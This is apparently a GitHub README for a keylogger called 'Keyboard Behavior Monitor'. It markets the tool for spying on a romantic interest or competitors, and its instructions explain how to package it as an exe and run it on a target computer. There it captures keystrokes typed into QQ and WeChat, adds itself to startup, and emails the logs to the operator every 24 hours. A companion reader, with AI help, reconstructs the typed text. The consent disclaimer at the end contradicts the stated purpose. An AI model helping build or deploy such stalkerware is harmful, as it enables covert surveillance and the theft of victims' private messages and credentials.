# Keyboard Behavior Monitor

## Overview

Still lingering over the girl you like? Anxious about your competitors? This program can help you monitor the keyboard activities of target applications (such as QQ or WeChat) and record this data, which will automatically be sent to your email after a period of time.

### Features

- **Application Monitoring**: This program monitors the running status of customized applications. When it detects that a specified application is running, it begins recording keyboard behavior.
- **Auto Startup**: Once the packaged file is executed, it automatically adds itself to the startup folder, enabling the auto-startup function.
- **Keystroke Logging**: Records detailed information about keyboard presses, including key content, number of presses, and time of pressing.
- **Data Storage**: The recorded data is stored as compressed binary files to save storage space.
- **Email Sending**: The program regularly checks and sends the recorded keyboard data through the specified email.
- **Data Reading**: An independent program, `Read.py`, is provided to decompress and read the stored binary data, displaying the data in a tabular format that can be exported as CSV or Excel files.
- **Packaging Tool**: A [Packaging Tool](https://github.com/ystemsrx/Application-Monitoring/releases) is provided to package the program into a single executable file with support for custom icons.

### File Descriptions

- **Application_Monitoring**: The main program, used to monitor the running status of QQ and WeChat, record keyboard behavior, save the data as compressed binary files, and send it via email at regular intervals.
- **Read.py**: Data reading tool that decompresses and reads the binary files generated by `Application_Monitoring`, providing data visualization and export functions. We have also added an AI-based data interpretation feature for this tool (you need to provide your **own API** and fill it in the list at the beginning of the code, currently only supporting OpenAI, Zhipu Qingyan, Tongyi Qianwen).
- **Package_tool.py**: Packaging tool used to package Python scripts into a single executable file with support for custom icons.

### Instructions

1. **Monitoring and Recording**:
   - Package `Application_Monitoring` (using the [packaging tool](https://github.com/ystemsrx/Application-Monitoring/releases)) into an exe, and then run it on the target computer. The program will continuously and automatically detect the running status of QQ and WeChat in the background and begin recording keyboard input.
   - The data will be stored in real-time in the `key_data.bin` file.
   - Every 24 hours, the data will be sent to you via email.

2. **Reading and Exporting**:
   - Run the `Read.py` program and drag the `key_data.bin` file into it to view the recorded keyboard input data.
     
     âš  **Important: Running [Read.py](Read.py) requires the installation of `PyQt5`, `Pandas` and `requests` libraries. Install them using `pip install pyqt5 pandas requests`.**

   - You can filter and export the data as CSV or Excel files for further analysis.

3. **Packaging Tool**:

   - Your computer must have Python installed, which can be [downloaded here](https://www.python.org/downloads/release/python-3125/).
   - The packaging tool can package the above two scripts into standalone executable files. [Click here](https://github.com/ystemsrx/Application-Monitoring/releases). Drag the Python scripts into the interface to package them, supporting the addition of custom icons (drag images or icons directly).

### Required Inputs

In the `Application_Monitoring` file, there are several areas that need to be filled in and modified to ensure the program works as intended:

1. **Email Configuration**:
   - `from_addr`: Sender's email address.
   - `to_addr`: Recipient's email address.
   - `password`: Sender's email SMTP authorization code. Please search for how to obtain this authorization code.

   Example:
   ```python
   from_addr = "your_email@example.com"
   to_addr = "recipient_email@example.com"
   password = "your_email_password_or_smtp_token"
   ```

2. **File Storage Path**:
   - `compressed_file`: The file path for storing compressed data. Modify the storage path as needed to ensure the program has permission to read and write files at that path. It is recommended to write to a drive other than the C drive.

   Example:
   ```python
   compressed_file = "D:\\your_path\\compressed_key_data.bin"
   ```

3. **Time Interval Setting**:
   - `interval_time`: The program is set by default to send recorded emails every 24 hours (86400 seconds). You can modify this time interval as needed, with the default being 24 hours.

   Example, modify to send every 12 hours:
   ```python
   interval_time = 43200:  # 12 hours in seconds
   ```

4. **Application List**:
   - Add applications to `applications = ["QQ", "WeChat"]`. By default, QQ and WeChat are included, and applications should be separated by commas and enclosed in quotation marks. **Note**: Applications must be listed by their process name rather than their own name (as seen in Task Manager). For example, **Enterprise WeChat** is called **WXWork**.

5. **API List in [Read.py](Read.py)**:
   - If you need to use the AI data interpretation function, please fill in your own API KEY in the list. If you prefer not to fill it in the list, you can temporarily enter it when the program starts. Currently, we only support API KEYS from OpenAI, Zhipu Qingyan, and Tongyi Qianwen. You can also add more models yourself in the `setup_model_selector` function.

### TODO List

- [x] **Unified Application Monitoring**: Monitor an application simply by entering its name in the list, without manually adjusting the program code.

- [x] **Data Interpretation Tool**: The current program can only record keystrokes but cannot interpret complete Pinyin input. We will develop a tool that can interpret and reconstruct the actual text input by the user, making it easier to understand the input content.

- [X] **Auto Startup**: Added auto startup feature.

### Disclaimer

The functions involved in this program may infringe on personal privacy or violate laws and regulations. Please ensure that you have obtained explicit consent from the relevant individuals before use and comply with the laws of your location. Unpermitted monitoring and data collection may result in legal liabilities. The developers are not responsible for any illegal use or consequences arising therefrom.

---

**Important Reminder**: Please use this program with caution and abide by all relevant laws and regulations.

---
